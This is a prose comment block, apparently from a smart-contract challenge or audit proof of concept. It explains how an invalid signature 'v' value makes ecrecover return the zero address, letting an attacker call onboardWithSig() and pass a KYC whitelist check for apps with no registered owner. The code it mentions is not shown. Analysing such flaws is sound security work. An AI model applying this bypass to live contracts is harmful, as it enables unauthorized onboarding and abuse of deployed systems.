    # exploit
    # The vulnerability is found inside the `_checkWhiteListed()` function in the
    # KYC contract. The function checks the address retrived from ercrecover against
    # the whitelistedOwner mapping. However, if someone is trying to onboard an app without
    # the owner applying for the app, through the `applyFor()` function, then the whitelistedOwners
    # mapping will return the zero address. Therefore, an attacker only needs to call the
    # `onboardWithSig()` function with a signature of valid length, but one that will cause the
    # ercrecover function to fail and return the zero address. This will allow them to onboard an App
    # and pass the check in the `_checkWhiteListed()` function. In order to make the ercrevocer function
    # fail the attacker can use an invalid `v` value. I.e. not 27 or 28. In the POC below I did more than
    # what is necessary. I could have simply created a signature from a hash and message myself and modified
    # the `v` value of the signature. However, I wanted to demonstrate how an Attacker could recover the
    # signature from a previous transaction. It was also a good exercise to reason about calldata.
